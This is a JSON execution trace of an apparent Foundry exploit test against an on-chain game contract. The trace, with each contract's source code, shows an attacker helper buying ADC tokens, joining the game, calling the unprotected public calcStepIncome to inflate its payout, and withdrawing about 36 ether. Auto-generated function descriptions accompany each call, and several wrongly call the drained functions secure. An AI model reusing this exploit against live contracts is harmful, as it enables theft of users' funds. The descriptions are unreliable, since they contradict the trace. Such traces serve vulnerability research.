{
  "logs": {
    "calls": [
      {
        "id": "23756",
        "contract": "ExploitScript",
        "function": "testExploit",
        "value": null,
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "0",
            "contract": "VM",
            "function": "deal",
            "value": null,
            "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": []
          }
        ]
      },
      {
        "id": "2073738",
        "contract": "Exploit",
        "function": "testexploit",
        "args": "",
        "original_code": "    function testexploit() public payable {\n        Helper = new Help{value: 18 ether}();\n\n        WETH.approve(address(mainpool), 18 ether);\n        WETH.approve(address(tick), 18 ether);\n        WETH.approve(address(Helper), 18 ether);\n\n        Helper.startwith();\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", address(Helper).balance, 18);\n    }\n\n",
        "description": "1. **Core functions**:  \n   The `testexploit` function is designed to simulate an exploit scenario. It creates a new instance of a helper contract (`Helper`) and sends 18 ether to it. Then, it approves three different addresses (mainpool, tick, and Helper) to spend 18 ether worth of WETH (a wrapped version of Ethereum). After setting up these approvals, it triggers the `startwith` function in the `Helper` contract. Finally, it logs the attacker's WETH balance after the exploit.\n\n2. **Security mechanism**:  \n   The function uses the `payable` keyword, allowing it to receive ether. It also uses the `approve` function to grant spending permissions for WETH tokens to specific addresses. However, there are no explicit security checks or modifiers in this function, which could make it vulnerable to misuse or unintended behavior.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It operates with fixed values, such as 18 ether and the predefined addresses (`mainpool`, `tick`, and `Helper`). These values are hardcoded into the function, limiting its flexibility and potentially making it less adaptable to different scenarios.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it emits an event (`log_named_decimal_uint`) that logs the attacker's WETH balance after the exploit. The balance is displayed in a human-readable format with 18 decimal places, which is standard for Ethereum-based tokens.\n\n**In summary**,  \nThe `testexploit` function simulates an exploit by creating a helper contract, sending ether, and approving WETH spending permissions. It lacks explicit security measures and uses hardcoded values, which could pose risks. The function logs the attacker's WETH balance after the exploit but does not return any value.",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "1829067",
            "contract": "→ new Help@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f",
            "function": "constructor",
            "args": "",
            "return_value": "5734 bytes of code",
            "depth": 1,
            "internal_calls": [
              {
                "id": "63413",
                "contract": "0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50",
                "function": "buyADC",
                "args": "",
                "original_code": "    function buyADC() public payable{\n        uint256 msgValue = msg.value;\n        uint256 adcAmount;\n        uint256 saleADC;\n        \n        if(!fristTime){\n            tokenADC.ticketGet();\n            fristTime = true;\n        }\n        require(msgValue >= minInPay,\" value to smail buyADC\");\n        require((totalBalance-totalCheckOut) == tokenADC.balanceOf(address(this)),\"balance not right\");\n        \n        saleADC = (msgValue* changeRatio[curentLevel])/10**18; //msgValue.div(10**18).mul(changeRatio[curentLevel]);\n        \n        teamAddr.transfer(msgValue);\n        adcAmount = CrossLevel(saleADC,msgValue);\n        \n        tokenADC.transfer(msg.sender,adcAmount);\n        \n        if(msgValue >= 100*10**18){\n            mPoolInterface(addrM.getAddr(\"MAINPOOL\")).setAmbFlag(msg.sender);\n        }\n        \n        totalCheckOut += adcAmount;\n        \n    }\n    \n",
                "description": "1. Core functions:  \nThe `buyADC` function allows users to purchase a token called `ADC` by sending Ether (ETH) to the contract. It calculates the amount of `ADC` tokens the user receives based on the amount of ETH sent and a predefined exchange rate. The function also ensures that the contract’s balance is correct and transfers the ETH to a team address. Additionally, it updates the total amount of `ADC` tokens distributed and sets a special flag for users who send a large amount of ETH.\n\n2. Security mechanism:  \n- **`require` statements**: These ensure that the ETH sent is above a minimum threshold (`minInPay`) and that the contract’s balance matches the expected amount. These checks prevent invalid transactions and ensure the contract operates correctly.  \n- **`payable` modifier**: Allows the function to receive ETH.  \n- **Balance checks**: The function verifies that the contract’s balance is consistent with the expected amount of `ADC` tokens, preventing mismanagement of funds.  \n- **Transfer to team address**: The ETH sent by the user is securely transferred to a designated team address.  \n\n3. Parameter Function:  \nThe function does not take any explicit parameters. Instead, it uses `msg.value`, which represents the amount of ETH sent by the user. This value is used to calculate the amount of `ADC` tokens the user will receive.  \n\n4. Return description:  \nThe function does not return any value directly. However, it performs the following actions:  \n- Calculates the amount of `ADC` tokens (`saleADC`) based on the ETH sent (`msg.value`) and a predefined exchange rate (`changeRatio[curentLevel]`).  \n- Adjusts the `ADC` amount further using the `CrossLevel` function, which likely applies additional logic based on the ETH amount.  \n- Transfers the calculated `ADC` tokens to the user.  \n- Updates the total amount of `ADC` tokens distributed (`totalCheckOut`).  \n\nIn summary,  \nThe `buyADC` function enables users to purchase `ADC` tokens by sending ETH. It ensures the transaction is valid, calculates the token amount based on the ETH sent, and transfers the ETH to a team address. It also updates the total tokens distributed and sets a special flag for large transactions. Security measures include balance checks and minimum ETH requirements to prevent errors and misuse.",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "2519",
                    "contract": "0xD357e4940b34Eb1406ef6A1Af53954e641273a3B",
                    "function": "balanceOf",
                    "args": "0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50",
                    "original_code": "",
                    "description": "",
                    "return_value": "148551434380952380952375000 [1.485e26]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "0",
                    "contract": "0x1d13502CfB73FCa360d1af7703cD3F47abA809b5",
                    "function": "fallback",
                    "value": "value: 3000000000000000000",
                    "args": "",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "28156",
                    "contract": "0xD357e4940b34Eb1406ef6A1Af53954e641273a3B",
                    "function": "transfer",
                    "args": "Help: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 15000000000000000000000 [1.5e22]",
                    "original_code": "",
                    "description": "",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              },
              {
                "id": "435697",
                "contract": "0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8",
                "function": "joinGame",
                "args": "Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                "original_code": "    function joinGame(address parentAddr) public payable notContract(msg.sender){\n        // check ticket\n        uint256 tmPid = plyrID[msg.sender];\n        if(tmPid ==0){\n            require(msg.sender != parentAddr,\"parent same as msg sender\");\n        }\n        require(checkTicket(msg.sender,msg.value),\"check ticket fail\");\n        \n        // check invite\n        uint256 pID =plyrID[msg.sender];\n        \n        uint256 parentPid_ = plyrID[parentAddr];\n        uint256 inBalance = plyr[RID][pID].ticketInCost;\n        \n        allInBalance[RID] += inBalance;\n        \n        if(tmPid == 0 && !vipPly[msg.sender]){\n            plyRShip[pID].parentPID = parentPid_;\n            // topPID\n            if(parentPid_ == 0){\n                plyRShip[pID].topPID = pID;\n            }else{\n                plyRShip[pID].topPID = plyRShip[parentPid_].topPID;\n            }\n        }\n        \n        /*if(plyr[RID][parentPid_].lastCalcDITime == 0){\n            plyr[RID][parentPid_].lastCalcDITime = now;\n        }*/\n        \n        if (RID > 1 && !vipPly[msg.sender] && !vipPlayerID[parentPid_]){\n            activeParent(pID,parentPid_,plyr[RID][pID].ticketInCost);\n        } \n    \n        // the pool  5% for insurance pool\n        if(insePoolBalance[RID] >= 50000*10**18){\n           mainPoolBalance[RID] += inBalance; \n           mainPoolLockBal[RID] += inBalance;\n           mainPoolWithdrawBalance[RID] += inBalance;\n        }else{\n            uint256 temp = inBalance*95/100;\n            insePoolBalance[RID] += inBalance*5/100;\n            mainPoolBalance[RID] += temp;\n            mainPoolLockBal[RID] += temp;\n            mainPoolWithdrawBalance[RID] += temp;\n        }\n        \n        \n    \n        // find parents calc earn\n        calcEarn(pID,inBalance);\n        \n        //check pool state\n        setRoundInfo(pID);\n        \n    }\n    \n",
                "description": "1. **Core functions:**  \n   The `joinGame` function allows a user to participate in a game by sending a payment (Ether) to the contract. It checks if the user has a valid ticket and ensures they are not a contract. The function also handles the relationship between the user and their parent (referrer), updates balances in different pools (like the insurance pool and main pool), and calculates earnings based on the user's participation. Additionally, it ensures the game's state is updated correctly.\n\n2. **Security mechanism:**  \n   - **`notContract(msg.sender)`:** Ensures that the caller is not a contract, preventing automated or malicious contract interactions.  \n   - **`require` statements:** These checks ensure that the user cannot refer themselves (`msg.sender != parentAddr`) and that the ticket is valid (`checkTicket(msg.sender, msg.value)`).  \n   - **Balance updates:** The function carefully updates balances in the insurance and main pools, ensuring funds are allocated correctly.  \n   - **Parent-child relationship:** The function verifies and sets the relationship between the user and their parent, preventing invalid or circular references.  \n\n3. **Parameter Function:**  \n   - **`parentAddr`:** This is the address of the user's parent (referrer). The function uses this to establish a relationship between the user and their parent, which is important for calculating earnings and maintaining the game's structure.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it performs several internal operations:  \n   - Updates the user's relationship with their parent.  \n   - Distributes the payment into different pools (insurance and main pools).  \n   - Calculates earnings for the user and their parent.  \n   - Updates the game's state to reflect the new participation.  \n\nIn summary, the `joinGame` function enables users to join a game, ensures security through various checks, manages relationships and balances, and updates the game's state without returning a direct value.",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "1322",
                    "contract": "0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50",
                    "function": "calDeductionADC",
                    "value": null,
                    "args": "15000000000000000000 [1.5e19], true",
                    "return_value": "0x0000000000000000000000000000000000000000000000cb49b44ba602d80000",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "17244",
                    "contract": "0xD357e4940b34Eb1406ef6A1Af53954e641273a3B",
                    "function": "c3637897",
                    "value": null,
                    "args": "0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000cb49b44ba602d80000",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "5753",
                        "contract": "0x49E298B95Bda30e6518509187Ff348e01117f404",
                        "function": "getAddr",
                        "value": null,
                        "args": "\"MAINPOOL\"",
                        "return_value": "0x000000000000000000000000de46fcf6ab7559e4355b8ee3d7fba0f2730cddd8",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  }
                ]
              },
              {
                "id": "47148",
                "contract": "0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8",
                "function": "calcStepIncome",
                "args": "529, 36099999999999999900 [3.609e19], 100",
                "original_code": "    function calcStepIncome(uint256 pid_,uint256 value_,uint8 dividendAccount_) public{\n    \n        \n            uint256    spIncome = (value_*dividendAccount_)/100;\n                if(plyr[RID][pid_].totalSettled >= playBiggertReward[RID][pid_]){\n                    return;\n                }\n                if(plyr[RID][pid_].totalSettled+spIncome>playBiggertReward[RID][pid_]){\n                    spIncome = playBiggertReward[RID][pid_]-plyr[RID][pid_].totalSettled;\n                }\n                //if(mainPoolBalance[RID] > spIncome){\n                    plyr[RID][pid_].stepIncome += spIncome;\n                    //plyBalance[RID][pid_] += spIncome;\n                    plyr[RID][pid_].totalSettled += spIncome;\n                    mainPoolBalance[RID] -= spIncome;\n                /*}else{\n                    \n                    plyr[RID][pid_].stepIncome += mainPoolBalance[RID];\n                    //plyBalance[RID][pid_] += mainPoolBalance[RID];\n                    plyr[RID][pid_].totalSettled += mainPoolBalance[RID];\n                    mainPoolBalance[RID] =0;\n                }*/\n            \n        \n        \n    }\n    \n    \n",
                "description": "1. **Core functions**:  \n   The `calcStepIncome` function calculates and distributes a portion of income (referred to as \"step income\") to a specific player based on their participation in a game or system. It takes into account the player's current settled amount and ensures that the distributed income does not exceed a predefined reward limit. The function also updates the main pool balance by deducting the distributed amount.\n\n2. **Security mechanism**:  \n   - The function does not include explicit access control modifiers (e.g., `onlyOwner` or `require` statements), which could be a security concern.  \n   - It checks whether the player's total settled amount exceeds the reward limit before proceeding, preventing over-distribution.  \n   - The function ensures that the distributed income does not exceed the remaining reward limit by adjusting the `spIncome` value if necessary.  \n   - The commented-out section suggests that there was an additional check to ensure the main pool balance is sufficient, but it is currently inactive.  \n\n3. **Parameter Function**:  \n   - `pid_`: Represents the player's unique identifier, used to locate the player's data in the system.  \n   - `value_`: The base value used to calculate the step income.  \n   - `dividendAccount_`: A percentage value (out of 100) that determines the portion of `value_` to be distributed as step income.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it updates the following:  \n   - The player's `stepIncome` by adding the calculated `spIncome`.  \n   - The player's `totalSettled` by adding the `spIncome`.  \n   - The `mainPoolBalance` by deducting the `spIncome`.  \n\nIn summary, the `calcStepIncome` function calculates and distributes income to a player while ensuring it does not exceed a predefined reward limit. It updates the player's income and settled amounts, as well as the main pool balance. However, the lack of explicit access controls and the inactive balance check could pose security risks.",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "24420",
            "contract": "wETH",
            "function": "approve",
            "args": "0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8, 18000000000000000000 [1.8e19]",
            "original_code": "",
            "description": "",
            "return_value": "true",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "24420",
            "contract": "wETH",
            "function": "approve",
            "args": "0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50, 18000000000000000000 [1.8e19]",
            "flag": 1,
            "return_value": "true",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "24420",
            "contract": "wETH",
            "function": "approve",
            "args": "Help: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 18000000000000000000 [1.8e19]",
            "flag": 1,
            "return_value": "true",
            "depth": 1,
            "internal_calls": []
          },
          {
            "id": "101781",
            "contract": "Help",
            "function": "startwith",
            "args": "",
            "original_code": "    function startwith() external {\n        mainpool.withdraw();\n    }\n\n",
            "description": "1. Core functions:\n   The `startwith` function is designed to initiate a withdrawal process from a main pool. It calls the `withdraw` function of the `mainpool` object, which presumably handles the logic for withdrawing funds or resources from the pool.\n\n2. Security mechanism:\n   The function is marked as `external`, meaning it can only be called from outside the contract, not from within it. This restricts internal access and ensures that only external entities can trigger the withdrawal process. However, there are no additional modifiers or explicit defense measures in this function, such as access control or checks for reentrancy, which could be potential security concerns.\n\n3. Parameter Function:\n   The `startwith` function does not take any parameters. It simply triggers the `withdraw` function of the `mainpool` object without requiring any additional input.\n\n4. Return description:\n   The `startwith` function does not return any value. Its sole purpose is to execute the `withdraw` function of the `mainpool` object, and it does not produce any output or result.\n\nIn summary, the `startwith` function is a straightforward external function that initiates a withdrawal from a main pool. It lacks parameters and return values, and its security relies on the `external` modifier, which restricts internal access. However, it does not include additional security measures, which could be a concern depending on the context.",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "101143",
                "contract": "0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8",
                "function": "withdraw",
                "args": "",
                "original_code": "    function withdraw() public{\n        //check ADC \n        uint256 pid = plyrID[msg.sender];\n        uint256 bunlers = 0;\n        //if(pid > 11){\n            require(plyr[RID][pid].isActive,\"ply not active\");\n        //}\n        require(mainPoolWithdrawBalance[RID]>0,\"pool not withdraw balance\");\n        if(RID > 1 && !plyr[RID-1][pid].isAlreadGetIns){\n            //check last round \n            if(luckPID[RID-1][pid]&& insePoolBalance[RID-1] > 0 ){\n                if(pid == round[RID-1].plyInList[round[RID-1].fritInsePoint]){\n                    bunlers = round[RID-1].fritInseAmount;\n                    insePoolBalance[RID-1] -= bunlers;\n                }else{\n                    bunlers = plyr[RID-1][pid].ticketInCost*2;\n                    if(bunlers > insePoolBalance[RID-1]){\n                        insePoolBalance[RID-1] = 0;\n                        bunlers = insePoolBalance[RID-1] ;\n                    }else{\n                        insePoolBalance[RID-1] -= bunlers;\n                    }\n                    \n                }\n                \n                mainPoolBalance[RID] -= bunlers;\n                plyr[RID-1][pid].isAlreadGetIns = true;\n                plyLucklyAmount[RID-1][pid] = bunlers;\n            }\n        }/*else{\n            require(plyWithdrawBalance[RID][pid] <= plyBalance[RID][pid],\"not enought balance can withdraw\");\n        }*/\n        \n        uint256 wdBalance;\n        if(plyr[RID][pid].totalSettled>plyWithdrawBalance[RID][pid] ){\n            wdBalance = plyr[RID][pid].totalSettled-plyWithdrawBalance[RID][pid] ;\n        }\n        if(bunlers == 0){\n            require(wdBalance > 0,\"not enought balance can withdraw\");\n        }\n        \n        \n        uint256 totalWdBal = wdBalance + bunlers;\n        //wdBalance += bunlers;\n        if(totalWdBal > mainPoolWithdrawBalance[RID]){\n            totalWdBal = mainPoolWithdrawBalance[RID];\n        }\n        uint256 disAmount  = tickect.calDeductionADC(totalWdBal,false);\n        require(adcERC20.balanceOf(msg.sender)>disAmount,\"not adc to buy out tikcet\");\n        adcERC20.distroy(msg.sender,disAmount);\n        playDistroyADC[pid] += disAmount;\n        totalDistroyADC += disAmount;\n        if(totalWdBal >= mainPoolWithdrawBalance[RID]){\n            mainPoolWithdrawBalance[RID] = 0;\n            plyr[RID][pid].withdrawAmount += mainPoolWithdrawBalance[RID];\n            alreadyWithDrawBal[RID] += mainPoolWithdrawBalance[RID];\n            msg.sender.transfer(mainPoolWithdrawBalance[RID]);\n            \n        }else{\n            mainPoolWithdrawBalance[RID] -= totalWdBal;\n            plyr[RID][pid].withdrawAmount += wdBalance;\n            alreadyWithDrawBal[RID] += totalWdBal;\n            msg.sender.transfer(totalWdBal);\n            \n        }\n        \n        plyWithdrawBalance[RID][pid] += wdBalance;\n        \n        plyr[RID][pid].staticIncome = 0;\n        plyr[RID][pid].dynamicIncome = 0;\n        plyr[RID][pid].stepIncome = 0;\n        ambRewardBalance[RID][pid] = 0;\n        plydV6Income[RID][pid] = 0;\n    }\n    \n    // settlement Static income by web\n",
                "description": "1. Core functions:  \nThe `withdraw` function allows a user to withdraw funds from a pool based on their participation and eligibility. It checks if the user is active and if the pool has sufficient balance for withdrawal. It also calculates the amount the user can withdraw, considering any bonuses or deductions, and transfers the funds to the user's address. Additionally, it updates the pool balance and the user's withdrawal history.\n\n2. Security mechanism:  \n- **`require` statements**: These ensure that the user is active, the pool has sufficient balance, and the user has enough funds to cover deductions.  \n- **Conditional checks**: The function verifies if the user is eligible for bonuses from previous rounds and ensures the pool balance is updated correctly.  \n- **Balance adjustments**: The function deducts the withdrawn amount from the pool and updates the user's withdrawal records to prevent double-spending or over-withdrawal.  \n\n3. Parameter Function:  \nThe function does not take any explicit parameters. Instead, it uses the `msg.sender` address to identify the caller and fetch their associated data, such as their player ID (`pid`) and participation details. This ensures the function operates on the correct user's data.\n\n4. Return description:  \nThe function does not return any value. Instead, it performs actions such as transferring funds to the user's address, updating pool balances, and recording the withdrawal details. The logic ensures that the user receives the correct amount after applying any bonuses or deductions, and the pool balance is adjusted accordingly.  \n\nIn summary, the `withdraw` function enables users to withdraw funds from a pool while ensuring security through checks and balances. It uses the caller's address to fetch relevant data, calculates the withdrawal amount, and updates the system state to reflect the transaction.",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "1312",
                    "contract": "0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50",
                    "function": "calDeductionADC",
                    "value": null,
                    "args": "36099999999999999900 [3.609e19], false",
                    "return_value": "0x0000000000000000000000000000000000000000000001e93f08f3802c639e58",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "519",
                    "contract": "0xD357e4940b34Eb1406ef6A1Af53954e641273a3B",
                    "function": "balanceOf",
                    "args": "Help: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]",
                    "flag": 1,
                    "return_value": "11250000000000000000000 [1.125e22]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "3944",
                    "contract": "0xD357e4940b34Eb1406ef6A1Af53954e641273a3B",
                    "function": "c3637897",
                    "value": null,
                    "args": "0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000001e93f08f3802c639e58",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "1753",
                        "contract": "0x49E298B95Bda30e6518509187Ff348e01117f404",
                        "function": "getAddr",
                        "value": null,
                        "args": "\"MAINPOOL\"",
                        "return_value": "0x000000000000000000000000de46fcf6ab7559e4355b8ee3d7fba0f2730cddd8",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "41",
                    "contract": "Help",
                    "function": "fallback",
                    "value": "value: 36099999999999999900",
                    "args": "",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              }
            ]
          }
        ]
      }
    ]
  }
}